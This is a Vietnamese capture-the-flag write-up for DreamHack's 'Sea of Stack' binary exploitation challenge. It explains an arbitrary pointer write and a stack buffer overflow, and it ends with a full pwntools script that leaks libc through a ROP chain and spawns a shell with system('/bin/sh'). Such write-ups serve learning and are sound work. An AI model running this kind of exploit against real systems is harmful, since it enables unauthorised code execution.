# Sea-of-Stack---Write-up-----DreamHack
Hướng dẫn cách giải bài Sea of Stack cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 5/3/2026

## 1. Mục tiêu cần làm
Vẫn như cũ

<img width="397" height="216" alt="image" src="https://github.com/user-attachments/assets/fced40fa-81ea-4a6c-86f5-306e9662d2b6" />

Giờ hãy đọc qua code như nào đã. Ta chỉ cần chú ý 3 thằng là

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-30h] BYREF
  _QWORD *v5; // [rsp+8h] [rbp-28h] BYREF
  char s1[28]; // [rsp+10h] [rbp-20h] BYREF
  int number; // [rsp+2Ch] [rbp-4h]

  proc_init();
  printf("If you really want to give me a present, bring me that kind detective's heart.\n> ");
  read_input((__int64)s1, 16);
  if ( !strcmp(s1, "Decision2Solve") && !gotPresent )
  {
    read_input((__int64)&v5, 8);
    read_input((__int64)&v4, 6);
    *v5 = v4;              // Sửa đổi con trỏ tùy ý
    gotPresent = 1LL;
  }
  print_menu();
  number = read_number();
  if ( number == 1 )
  {
    safe();
  }
  else if ( number == 2 )
  {
    unsafe();
  }
  return 0;
}
```

```C
__int64 unsafe_func()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  return read_input((__int64)v1, 0x10000);  // Buffer Overflow
}
```

```C
__int64 __fastcall read_input(__int64 a1, int a2)
{
  char buf; // [rsp+17h] [rbp-9h] BYREF
  unsigned int v4; // [rsp+18h] [rbp-8h]
  int v5; // [rsp+1Ch] [rbp-4h]

  v5 = 0;
  do
  {
    v4 = read(0, &buf, 1uLL);
    if ( (v4 & 0x80000000) != 0 )
    {
      fwrite("read error!\n", 1uLL, 0xCuLL, stderr);
      exit(1);
    }
    *(_BYTE *)(a1 + v5++) = buf;
  }
  while ( v5 != a2 );
  if ( *(_BYTE *)(v5 - 1LL + a1) == 10 )
    *(_BYTE *)(v5 - 1LL + a1) = 0;
  return v4;
}
```

Đầu tiên là sửa đổi con trỏ, ta sẽ nhập vào biến `v5` và `v6`, sau đó tại vị trí của con trỏ `v5`, nó sẽ thay đổi thành giá trị `v6`. Ví dụ tại con trỏ `v5` đang trỏ vô `puts`, ta ghi vào biến `v6` là `system` thì giá trị con trỏ `v5` trỏ vào sẽ thay đổi từ `puts` thành `system`.

Tiếp theo là hàm `read_input`. Nó sẽ bắt chúng ta nhập đủ số lượng byte vào, ví dụ `return read_input((__int64)v1, 0x10000)` có nghĩa là phải nhập đủ `0x10000` byte vào. Nhưng ta có 1 vấn đề ở đây, vùng stack ta chỉ có thể ghi tối đa được 21000 byte thôi mà nó bắt ta nhập `0x10000` byte aka 65536 byte.

<img width="688" height="207" alt="image" src="https://github.com/user-attachments/assets/9581e35b-be5b-4e26-ab38-8b07dd3ddebd" />

Nếu ta nhập vậy thì sẽ bị lỗi, nhưng không sao, ta có thể mở rộng ra bằng cách nhìn vào thằng main.

<img width="590" height="107" alt="image" src="https://github.com/user-attachments/assets/ac69826a-af42-4e9f-ab0c-0c28aa0810e2" />

Mỗi lần nhảy vào hàm main thì ta sẽ được mở rộng thêm stack `0x30` byte, giờ ta chỉ cần nhảy vào nó đủ nhiều để mở rộng đến khi nhập đủ `0x10000` byte là được. Nhưng làm sao để nhảy vào `main` liên tục ?

Giờ hãy nhìn lại thằng đầu mình nói đi, `safe();` là 1 con trỏ trỏ vào hàm `safe_func`. Nếu ta dùng lỗi sửa con trỏ, thay vì khi `safe()` nhảy vào `safe_func` thì ta cho nó nhảy vào `main` là xong. Sau khi mở rộng đủ để nhập vào thì ta chỉ cần leak libc, sau đó thực thi system thôi.

## 2. Cách thực thi
Đầu tiên là sửa đổi con trỏ `safe`.

```Python
p.sendafter(b"heart.\n> ", b'Decision2Solve\x00\x00')
p.send(p64(e.symbols['safe']))
p.send(p64(e.symbols['main'])[:6])
p.sendafter(b'func\n> ', b'1')
```

Sau đó ta sẽ tạo 1 vòng lặp để nhảy vô `main` liên tục đến khi mở rộng đủ hoặc dư `0x10000` byte là đẹp.

```Python
for _ in range(0x400):
        print('.', end='', flush=True)
        p.sendafter(b'heart.\n>', b'A'*16)
        p.sendafter(b'func\n>', b'1')
```

Sau khi đã mở rộng đủ rồi, ta sẽ bắt đầu công cuộc tạo ROPchain leak libc thông qua `puts`.

```Python
pop_rdi_rbp = 0x40129b
payload = b'A' * 32
payload += b'B' * 8
payload += p64(pop_rdi_rbp)
payload += p64(e.got['puts'])
payload += b'C' * 8
payload += p64(e.plt['puts'])
payload += p64(e.symbols['unsafe_func'])
payload = payload.ljust(0x10000, b'\x00')
p.send(payload)
```

Bài này không cho ta `pop rdi` mà chỉ cho `pop rdi, pop rbp` nên ta cần thêm 1 padding cho `pop rbp` nữa. Sau khi leak được libc thì tính toán và sau đó tạo 1 ROPchain thực thi system là bú.

```Python
puts_addr = u64(p.recvline()[:-1].ljust(0x8, b'\x00'))
libc_base = puts_addr - 0x80ed0
system_addr = libc_base + 0x50d60
binsh_addr = libc_base + 0x1d8698
log.success(f'Libc leak : {hex(puts_addr)}')
log.success(f'Libc base : {hex(libc_base)}')

payload = b'A'*0x20 + b'B'*0x8
payload += p64(pop_rdi_rbp) + p64(binsh_addr) + b'C'*0x8
payload += p64(ret) + p64(system_addr)
payload = payload.ljust(0x10000, b'\x00')

p.send(payload)
```

Thế là xong, bài này mình thấy cũng cũng thôi không có gì hết. Mỗi tội dockerfile với offset trong đây hơi ngu học tí 🐧. Thôi thì chill đi, nhớ cho mình 1 star để có động lực viết write up tiếp nha 🐧.

<img width="800" height="800" alt="image" src="https://github.com/user-attachments/assets/1838653d-1e22-4e73-9748-387513ed8e74" />

## 3. Exploit

```Python
from pwn import *

e = ELF("./prob")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e

#p = process('./prob_patched')
p = remote('host3.dreamhack.games', 8585)

pop_rdi_rbp = 0x40129b
ret = 0x40101a

p.sendafter(b"heart.\n> ", b'Decision2Solve\x00\x00')
p.send(p64(e.symbols['safe']))
p.send(p64(e.symbols['main'])[:6])
p.sendafter(b'func\n> ', b'1')

for _ in range(0x400):
        print('.', end='', flush=True)
        p.sendafter(b'heart.\n>', b'A'*16)
        p.sendafter(b'func\n>', b'1')

p.sendafter(b'heart.\n> ', b'A'*16)
p.sendafter(b'func\n> ', b'2')

payload = b'A' * 32
payload += b'B' * 8
payload += p64(pop_rdi_rbp)
payload += p64(e.got['puts'])
payload += b'C' * 8
payload += p64(e.plt['puts'])
payload += p64(e.symbols['unsafe_func'])
payload = payload.ljust(0x10000, b'\x00')
p.send(payload)

puts_addr = u64(p.recvline()[:-1].ljust(0x8, b'\x00'))
libc_base = puts_addr - 0x80ed0
system_addr = libc_base + 0x50d60
binsh_addr = libc_base + 0x1d8698
log.success(f'Libc leak : {hex(puts_addr)}')
log.success(f'Libc base : {hex(libc_base)}')

payload = b'A'*0x20 + b'B'*0x8
payload += p64(pop_rdi_rbp) + p64(binsh_addr) + b'C'*0x8
payload += p64(ret) + p64(system_addr)
payload = payload.ljust(0x10000, b'\x00')

p.send(payload)

p.interactive()
```
